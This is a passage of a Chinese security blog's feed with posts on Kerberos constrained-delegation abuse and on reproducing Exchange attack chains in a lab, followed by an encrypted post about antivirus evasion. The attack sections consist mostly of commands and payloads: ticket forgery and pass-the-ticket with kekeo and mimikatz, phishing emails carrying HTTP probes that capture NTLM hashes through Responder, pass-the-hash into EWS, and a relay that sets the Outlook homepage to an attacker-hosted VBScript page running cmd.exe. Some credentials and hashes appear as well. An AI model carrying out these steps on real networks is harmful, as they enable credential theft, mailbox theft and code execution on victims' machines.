src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822150637.png" alt></p><p>OA上此时成功收到TGT，并转存TGT</p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822151441.png" alt></p><p>然后通过PTT，既可以远程同步域控ntds</p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822151937.png" alt></p><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​     微软自2003之后引入”约束委派”,其中包括kerberos协议的两个扩展,<strong>S4USelf，S4U2Proxy</strong>，当某个域内机器配置了约束委派，那么该机器即可接受域内任意用户的委派去请求域内的指定服务。</p><p><strong>大概流程:</strong></p><ul><li><p>当收到来自域用户的请求后，service1使用<strong>S4U2SELF协议</strong>代表用户去请求一个可以访问<strong>Service1自身的可转发的服务票据1。</strong></p></li><li><p>Service1通过服务票据用<strong>S4UProxy协议</strong>以该用户身份向KDC请求一个可以<strong>访问Service2的可转发的</strong></p><p><strong>服务票据2</strong></p></li><li><p>Service1在收到这个服务票据即可代表该用户去访问Service2。</p></li></ul><p><strong>注意区分这里的票据1和票据2：</strong></p><ul><li>第一个票据表示域控授权 Service1 可以代表指定用户来访问 Service1</li><li>第二个票据代表域控授权 service1 代表指定用户来访问 service2,</li></ul><h5 id="与非约束性委派的区别"><a href="#与非约束性委派的区别" class="headerlink" title="与非约束性委派的区别"></a>与非约束性委派的区别</h5><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>我们可以在域控的<strong>Active Directory 用户和计算机</strong>的用户组中进行配置:</p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822210445.png" alt></p><p><strong>约束委派的利用前提是我们已经拿到了设置约束委派的机器权限。</strong></p><p>之后我们可以使用adfind、powerview之类的工具查找设置约束委派的用户账户和机器账户:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">AdFind</span><span class="selector-class">.exe</span> <span class="selector-tag">-h</span> 172<span class="selector-class">.23</span><span class="selector-class">.119</span><span class="selector-class">.27</span> <span class="selector-tag">-u</span> <span class="selector-tag">k01</span>\<span class="selector-tag">sqladm</span> <span class="selector-tag">-up</span> <span class="selector-tag">admin</span>!@#45 -b <span class="string">"DC=k01,DC=local"</span> -f <span class="string">"(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))"</span> msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822211320.png" alt></p><p>之后我们可以使用kekeo先生成TGT：</p><p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p><p>Kekeo是一个强大的票据传递工具 :</p><ul><li>能够从用户的哈希 (rc4_hmac/aes128_cts_hmac_sha1/aes256_cts_hmac_sha1)请求票证授予票证(TGT) ，并将请求的 TGT 应用于当前登录会话。 这为 Mimikatz 的”over-pass-the-hash” 提供了一个替代方案，该方案不操作 LSASS 的内存，也不需要管理特权</li></ul><ul><li>从现有的 TGT 请求服务票证的能力</li></ul><ul><li>我所知道的除了 Impacket 之外唯一实现S4U 约束委派滥用(包括 sname 替换)的工具。 </li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">"tgt::ask /user:SECRETARY-PC<span class="variable">$</span> /domain:k01.local /NTLM:7b31c1ea95144617cc21861d5ba4c8ea"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822212331.png" alt></p><p>这里使用本地的ntlmhash 来生成访问 Service1的票据1</p><p>然后,伪造域管模拟 S4U 协议去请求转存服务票据2:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_SECRETARY-PC$@K01.LOCAL_krbtgt~k01.local@K01.LOCAL.kirbi /user:Administrator@k01.local /service:cifs/POLICE-PC.k01.local"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822212458.png" alt></p><p>之后我们可以mimikat来实现PTT，就能获得远程 Police-Pc 机器的权限</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@k01</span>.local<span class="keyword">@K01</span>.LOCAL_cifs~POLICE-PC.k01.local<span class="keyword">@K01</span>.LOCAL.kirbi" <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822214404.png" alt></p><p><img src="/2021/09/11/ji-yu-wei-pai-de-ce-shi/QQ%E6%88%AA%E5%9B%BE20210822214509.png" alt></p><h3 id="委派攻击的防御"><a href="#委派攻击的防御" class="headerlink" title="委派攻击的防御"></a>委派攻击的防御</h3><ul><li>不要在域中使用非约束委派功能</li><li>域中不需要使用委派的账户设置为“敏感用户不能被委派”</li><li>win2012的系统可以通过设置受保护的用户组来缓解委派所带来的危害</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>exchange攻击链复现(ntlm_relay_ews)</title>
    <link href="https://shu1l.github.io/2021/08/19/exchange-gong-ji-lian-fu-xian/"/>
    <id>https://shu1l.github.io/2021/08/19/exchange-gong-ji-lian-fu-xian/</id>
    <published>2021-08-19T09:32:13.000Z</published>
    <updated>2021-10-11T03:22:01.218Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="1-域环境搭建"><a href="#1-域环境搭建" class="headerlink" title="1.域环境搭建"></a>1.域环境搭建</h4><p>我们首先需要搭建一个简单的域环境,具体的搭建步骤可以参考:</p><p><a href="https://www.jianshu.com/p/2708f3dfb7cf" target="_blank" rel="noopener">配置Windows Server 2012域控环境，并抓取hash - 简书 (jianshu.com)</a></p><p>搭建的结果:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Winserver2012R2      DC域控   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.175</span></span><br><span class="line">Winserver2012R2      exchange服务器   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.185</span></span><br><span class="line">windows <span class="number">10</span> x64       win10成员机(受控机)      ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.143</span></span><br><span class="line"></span><br><span class="line">攻击者kali机   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.182</span></span><br></pre></td></tr></table></figure><p><strong>注:复现过程ip可能有变化</strong></p><p>域搭好后，我们需要添加一个或多个域用户，具体可以参考:</p><p><a href="https://blog.csdn.net/weixin_43760829/article/details/89437363" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43760829/article/details/89437363</a></p><h4 id="2-exchange服务搭建"><a href="#2-exchange服务搭建" class="headerlink" title="2.exchange服务搭建"></a>2.exchange服务搭建</h4><p>我们这里搭建的版本为:<strong>ExchangeServer2016-x64-cu12</strong></p><p>完整的搭建过程可以参考:</p><p><a href="https://www.bookstack.cn/read/exchange/date-2018.12.31.16.40.09" target="_blank" rel="noopener">Exchange 2016部署实施案例篇-03.Exchange部署篇（上） - 《exchange知识》 - 书栈网 · BookStack</a></p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209085337.png" alt="QQ截图20201209085337"></p><p>在exchange服务器上搭建好相关服务后，我们可以登录后发送一封邮件查看接收是否正常。</p><h4 id="3-outlook2016安装"><a href="#3-outlook2016安装" class="headerlink" title="3.outlook2016安装"></a>3.outlook2016安装</h4><p>网上找一个office2016全家桶破解版，一路下一步即可成功安装。</p><h4 id="4-win10受控机配置"><a href="#4-win10受控机配置" class="headerlink" title="4.win10受控机配置"></a>4.win10受控机配置</h4><p>配置java环境并安装burp,方便之后邮件抓包,具体步骤参考:</p><p><a href="https://www.cnblogs.com/v1vvwv/p/how-to-install-BurpSuite.html" target="_blank" rel="noopener">【工具安装】BurpSuite 安装教程 - Bay0net - 博客园 (cnblogs.com)</a></p><h4 id="5-ubuntu配置"><a href="#5-ubuntu配置" class="headerlink" title="5.ubuntu配置"></a>5.ubuntu配置</h4><p>​    我们需要安装配置的工具，Impacket是一个网络协议工具包，Responder用来窃取NTLMv哈希，NtlmRelayToEWS是一种用于在Exchange Web服务（EWS）上执行ntlm中继攻击的工具。</p><ul><li>impacket:<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></li><li>responder:<a href="https://github.com/lgandx/Responder" target="_blank" rel="noopener">https://github.com/lgandx/Responder</a></li><li>NTLMRelayToEWS:<a href="https://github.com/Arno0x/NtlmRelayToEWS" target="_blank" rel="noopener">https://github.com/Arno0x/NtlmRelayToEWS</a></li></ul><p>配置和具体使用方法可以参考帮助文档。</p><h3 id="攻击手法一复现"><a href="#攻击手法一复现" class="headerlink" title="攻击手法一复现"></a>攻击手法一复现</h3><h4 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">邮件探针（<span class="function"><span class="title">http</span>型/unc型）-&gt;</span>获取<span class="function"><span class="title">ntlmhashV1</span> -&gt;</span> 通过指定网站解密 -&gt; 使用解密出的ntlmhash登录ews接口获取邮件</span><br></pre></td></tr></table></figure><h4 id="1-配置-LM-身份验证级别-LmCompatibilityLevel"><a href="#1-配置-LM-身份验证级别-LmCompatibilityLevel" class="headerlink" title="1.配置(LM 身份验证级别)LmCompatibilityLevel"></a>1.配置(LM 身份验证级别)LmCompatibilityLevel</h4><p>​       我们知道Net-ntlm hash v1 本身存在缺陷，只要获取到Net-NTLM v1 都能破解为NTLM hash <strong>与密码强度无关</strong>。所以在多数情况下Net-ntlm hash v1 <strong>已经废弃</strong> ，如果想要启用，我们需要配置<strong>LM 身份验证级别</strong> 或者在注册表中修改LmCompatibilityLevel。</p><p><strong>具体步骤:</strong></p><ul><li>单击“开始”，指向“程序”，然后单击“管理工具”。</li><li>在“域控制器安全”策略中，展开“安全设置”，然后展开“本地策略”。</li><li>单击“安全选项”。</li><li>双击“网络安全:LAN Manager 身份验证级别”，然后单击列表中的适当值。</li></ul><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209164630.png" alt></p><p>我们这里直接选择最低的级别。分别在域控和我们的成员机进行同样的设置，这样就可以使用NTLMv1进行身份验证。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209164944.png" alt></p><h4 id="2-添加钓鱼域名dns记录"><a href="#2-添加钓鱼域名dns记录" class="headerlink" title="2.添加钓鱼域名dns记录"></a>2.添加钓鱼域名dns记录</h4><p>使用工具:<a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Powermad</a>  在已经被我们控制的win10域内机器上添加dns记录。</p><p>在powershell下进入powermad目录,执行命令:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Set-ExecutionPolicy</span> <span class="selector-tag">RemoteSigned</span></span><br><span class="line"><span class="selector-tag">Import-Module</span> .\<span class="selector-tag">Powermad</span><span class="selector-class">.psm1</span></span><br><span class="line"><span class="selector-tag">Invoke-DNSUpdate</span> <span class="selector-tag">-DNSType</span> <span class="selector-tag">A</span> <span class="selector-tag">-DNSName</span> <span class="selector-tag">hackshang</span> <span class="selector-tag">-DNSData</span> 192<span class="selector-class">.168</span><span class="selector-class">.111</span><span class="selector-class">.182</span>(攻击者公网或内网<span class="selector-tag">ip</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213223049.png" alt></p><h4 id="3-发送钓鱼邮件"><a href="#3-发送钓鱼邮件" class="headerlink" title="3.发送钓鱼邮件"></a>3.发送钓鱼邮件</h4><p>​    当我们已经获得一个域用户的账号密码时，我们从受控的机器上访问outlook网页版并登录邮箱。然后发送一封包含http或者unc路径的钓鱼邮件，在ExchangeServer2016下邮件中的unc路径会被过滤置空，所以我们这里插入http标签的方式进行测试:</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213224853.png" alt></p><p>使用burp抓取发送的包，在</p><p></p>标签之间插入:<p></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">\"&gt;hahahaha&lt;img src=\"http://hackshang/\"&gt;&lt;br&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214100114.png" alt></p><h4 id="4-开启responder监听"><a href="#4-开启responder监听" class="headerlink" title="4.开启responder监听"></a>4.开启responder监听</h4><p>监听前修改配置：</p><ul><li>修改Responder.conf⾥⾯的Challenge = 1122334455667788（旧版本默认值，无需修改)</li></ul><ul><li>修改packets.py⾥⾯的NTLM_Challenge类，修改NegoFlags为\x05\x02\x81\xa2</li></ul><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209173339.png" alt></p><p>开启监听</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python <span class="module-access"><span class="module"><span class="identifier">Responder</span>.</span></span>py -wrfv -I eth0</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209173959.png" alt></p><h4 id="5-受害者打开邮件"><a href="#5-受害者打开邮件" class="headerlink" title="5.受害者打开邮件"></a>5.受害者打开邮件</h4><p>当收件人从自己服务器上登录exchange。查看收到的邮箱：</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213233553.png" alt></p><p>攻击者同时收到收件人的net ntml v1 hash</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214093957.png" alt></p><p>格式是 ：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名::主机名<span class="selector-pseudo">:hash1</span><span class="selector-pseudo">:hash2</span><span class="selector-pseudo">:1122334455667788</span></span><br></pre></td></tr></table></figure><p> 一般来说hash1和hash2应该是⼀样的。</p><p>提取hash1,构造<strong>NTHASH:hash1</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTHASH:<span class="number">2617</span>F7B9DF8914D80AB037AE45621CE9C31E394AAD70F657</span><br></pre></td></tr></table></figure><h4 id="6-网站在线解密hash"><a href="#6-网站在线解密hash" class="headerlink" title="6.网站在线解密hash"></a>6.网站在线解密hash</h4><p>使用hashcat离线爆破，或者使用网站在线解密:<a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214094448.png" alt></p><p>放在<a href="https://crack.sh/get-cracking/⾥⾯，填写我们的邮箱，几十秒后就可以收到解密的hash：" target="_blank" rel="noopener">https://crack.sh/get-cracking/⾥⾯，填写我们的邮箱，几十秒后就可以收到解密的hash：</a></p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214094824.png" alt></p><h4 id="7-pth利用ews接口收取邮件"><a href="#7-pth利用ews接口收取邮件" class="headerlink" title="7.pth利用ews接口收取邮件"></a>7.pth利用ews接口收取邮件</h4><ul><li><a href="https://github.com/pentest-tools-public/Pass-to-hash-EWS" target="_blank" rel="noopener">https://github.com/pentest-tools-public/Pass-to-hash-EWS</a></li></ul><p>帮助文档中有详细介绍，我们将mimikatz和Pass-to-hash-EWS都传到win10上。然后依次执行:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">"sekurlsa::pth /user:shanghui /domain:exchange.shang.com /ntlm:642877b6e68fcd328d894ab2fe1f7609 /run:cmd"</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>使用mimikatz 进行ntlm pth 然后即可使用其他用户凭据对ews接口进行操作。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214100824.png" alt></p><p>使用默认凭证收取收件箱邮件.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth_to_ews.<span class="keyword">exe</span> http<span class="variable">s:</span>//exchange.shang.<span class="keyword">com</span>/ews/exchange.asmx -MType Inbox</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201209212915.png" alt></p><p>还有一些其他的操作，可以查看帮助文档。</p><h3 id="攻击手法二复现"><a href="#攻击手法二复现" class="headerlink" title="攻击手法二复现"></a>攻击手法二复现</h3><h4 id="攻击链-1"><a href="#攻击链-1" class="headerlink" title="攻击链"></a>攻击链</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">邮件探针（<span class="function"><span class="title">http</span>型/unc型）-&gt;</span>获取<span class="function"><span class="title">netntlmhashV2</span> -&gt;</span> <span class="function"><span class="title">relay</span>到ews接口 -&gt;</span> 获取邮件</span><br></pre></td></tr></table></figure><h4 id="1-配置-LM-身份验证级别-LmCompatibilityLevel-1"><a href="#1-配置-LM-身份验证级别-LmCompatibilityLevel-1" class="headerlink" title="1.配置(LM 身份验证级别)LmCompatibilityLevel"></a>1.配置(LM 身份验证级别)LmCompatibilityLevel</h4><p>我们需要重新配置身份认证级别，我这边调到了四级。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201210202233.png" alt></p><h4 id="2-获取net-ntlmv2-hash"><a href="#2-获取net-ntlmv2-hash" class="headerlink" title="2.获取net-ntlmv2 hash"></a>2.获取net-ntlmv2 hash</h4><p>之前的步骤与手法一均相同，当受害者打开钓鱼邮件时，我们的responder即可收到net-ntlmv2 hash。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213233522.png" alt></p><h4 id="3-relay到ews接口获取邮件"><a href="#3-relay到ews接口获取邮件" class="headerlink" title="3.relay到ews接口获取邮件"></a>3.relay到ews接口获取邮件</h4><p>工具:<a href="https://github.com/Arno0x/NtlmRelayToEWS" target="_blank" rel="noopener">https://github.com/Arno0x/NtlmRelayToEWS</a></p><p><strong>注:这里踩了个大坑，用的kali做的测试这里一直打不通，后来换了ubuntu一次成功，所以测试的时候不想踩坑还是用ubuntu。</strong></p><p>ubuntu执行命令:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">python</span> ntlmRelayToEWS.<span class="keyword">py</span> -t http<span class="variable">s:</span>//<span class="number">192.168</span>.<span class="number">111.170</span>/EWS/exchange.asmx -r getFolder -<span class="keyword">f</span> inbox -v</span><br></pre></td></tr></table></figure><p>受害人查看邮件，会自动获取受害人收件箱邮件并保存在本地。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213233812.png" alt></p><h3 id="攻击手法三复现"><a href="#攻击手法三复现" class="headerlink" title="攻击手法三复现"></a>攻击手法三复现</h3><h4 id="攻击链-2"><a href="#攻击链-2" class="headerlink" title="攻击链"></a>攻击链</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>. 邮件探针（<span class="function"><span class="title">http</span>型/unc型）-&gt;</span>获取<span class="function"><span class="title">netntlmhashV2</span> -&gt;</span> <span class="function"><span class="title">relay</span>到ews接口 -&gt;</span> 设置<span class="function"><span class="title">homepage</span> -&gt;</span> 获取主机权限</span><br></pre></td></tr></table></figure><h4 id="homepage利用"><a href="#homepage利用" class="headerlink" title="homepage利用"></a>homepage利用</h4><p>使用默认凭证验证ews接口设置outlook 客户端主页，url为远程pyloadurl,html里面写payload。</p><p>homepage的文章 <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/" target="_blank" rel="noopener">https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/</a></p><p>反弹shell执行命令处<code>cmd.Run(“cmd.exe”)</code>修改即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Language"</span> <span class="attr">content</span>=<span class="string">"en-us"</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=windows-1252"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Outlook<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">clientEventHandlersVBS</span> <span class="attr">language</span>=<span class="string">vbscript</span>&gt;</span><span class="javascript"> Sub window_onload()     <span class="built_in">Set</span> Application = ViewCtl1.OutlookApplication     <span class="built_in">Set</span> cmd = Application.CreateObject(<span class="string">"Wscript.Shell"</span>)     cmd.Run(<span class="string">"cmd.exe"</span>) End Sub</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">h1</span>&gt;</span> Hello Alex <span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">"clsid:0006F063-0000-0000-C000-000000000046"</span> <span class="attr">id</span>=<span class="string">"ViewCtl1"</span> <span class="attr">data</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用python起一个http服务，把html放在服务器下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8000</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201213234819.png" alt></p><p>使用NtlmRelayToEWS执行命令:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ntlmRelayToEWS.py -t https:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.170</span><span class="regexp">/EWS/</span>exchange.asmx -r setHomePage -f inbox -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">111.182</span>:<span class="number">8000</span><span class="regexp">/shang.html -v</span></span><br></pre></td></tr></table></figure><p>当收件人登录outlook查看钓鱼邮件时触发攻击:</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214001343.png" alt></p><p>返回查看homepage已被设置成我们的远程恶意html，我们刷新一下邮箱，成功执行命令。</p><p><img src="/2021/08/19/exchange-gong-ji-lian-fu-xian/QQ%E6%88%AA%E5%9B%BE20201214001626.png" alt></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>记录一些踩的坑点:</p><ul><li>在安装exchange之前要先将各种依赖环境先装好。注意不同的服务器支持的exchange版本。</li><li>搭建好完整的测试环境及时快照。</li><li>exchange各种服务启动需要一段时间，发现无法正常发送邮件，可以排查下pop3端口是否开启，或者直接重启或者恢复快照。</li><li>burp抓包添加http标签时，抓包时间过长可能导致邮件发送失败。</li><li>最好在ubuntu下使用ntlmRelayToEWS工具，kali下会遇到不知名报错。</li><li>使用ntlmRelayToEWS工具时，遇到证书报错，参考洪谷师傅的解决方法:<a href="http://hackergu.com/ssl-certificate_verify_failed-certificate-verify-failed-_ssl-c590-%e6%8a%a5%e9%94%99%e8%a7%a3%e5%86%b3/" target="_blank" rel="noopener">http://hackergu.com/ssl-certificate_verify_failed-certificate-verify-failed-_ssl-c590-%e6%8a%a5%e9%94%99%e8%a7%a3%e5%86%b3/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h3&gt;&lt;h4 id=&quot;1-域环境搭建&quot;&gt;&lt;a href=&quot;#1-域环境搭建&quot; class=&quot;headerlink&quot; title=&quot;1.域
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Tidesec免杀方法最新杀软测试结果</title>
    <link href="https://shu1l.github.io/2021/08/17/tidesec-mian-sha-fang-fa-zui-xin-sha-ruan-ce-shi-jie-guo/"/>
    <id>https://shu1l.github.io/2021/08/17/tidesec-mian-sha-fang-fa-zui-xin-sha-ruan-ce-shi-jie-guo/</id>
    <published>2021-08-17T06:03:58.000Z</published>
    <updated>2021-08-19T05:15:29.218Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="78ff39520f382fa99982574156f7edc6f681a1c9896524f8bd9868bc6c2404c4">c59e9380f1c5fd910807978d93c415076a38c50f8fbdeff601e3ca50b1ee38694ee0f6a2d2e31c100e4d2be0893750873fa34ad286c73dcfa562032ad4085e06b1cffee251983ca6c9d70d6afafe492676bb86f5e8a6e4459eadea353159cadab690db4581868c1293f4fa44e03a3c0c33e9d62c6f24c051207e9420b46e4c0697e48e6c63b0dfdcb6e49f51dec89a6ff201345a62b44a608ff1f5e2e4c12c5452e75d0190a37cfb71ede0e2b09b64aab23bb2b985e4ef6a7a96a70bbd930557a8f8838c6820f66e367873aaa6019f694e93e77d58b6549005ea183a9636afa6d735e79b5c254f5d03818b71fb4bb34bdf7c2dfdbb05eb25bee4b51d1463a93cf3a2d5dd1379a8e5d268b884c5d1a95b7b2b2192cd41420a4861d60f2329fd0960e149a3498568d13d3f4ba5385b8289f3250d1b9ec56fe51c9a8cc70a98b1ff71f29cfcd4b2cf44df403ba1cfbb68318804beeb06fc3639674ea04405210058f18ef675c4507a15bbad3ce93b91ded59e8d76c2c0413344c98643b638813ba092ab50937ada94fb137bd1fd0fe77a29b2d88d8a41a7c1a8b77a2c96bfb058427600e4a64d34102db6585d78e653e1fd523068c847230cc34dcccee9be08d55fdcc081b73da73a82ed2582c1a89122052673284cde91a00c9ab9f767efd106141cb8d2e73a41db67ce064626e6bc630a91c19174a9005c2b6854ad9211f89d7032c26599a733f78a8ce56fb17596228ec460789cc767edf2c567ae750c2b71731545131a6faa7befe03a87a73ed97953aa2da94e4c59c5e9b18f75b71ff9f4683a8b7e72dde81345f847c9e873430d6a858e84afb168355b2e993397aa2ae817ddf7eb3e4cb69865f6cc91c9a3f7ee975e3126555b3c841ec1adae8cb447cc88d70d1f3304c185eb523b69daf3c0a3d43c02d28b982b6812c7344a7887dc4343899cecf97bf5b94b4212f1d248769d2c77b534c6b1b7d009bfb53a3af80e76dac39280a6a77e930d8a3aae191df416ff297e50359f02354c1907fadb3b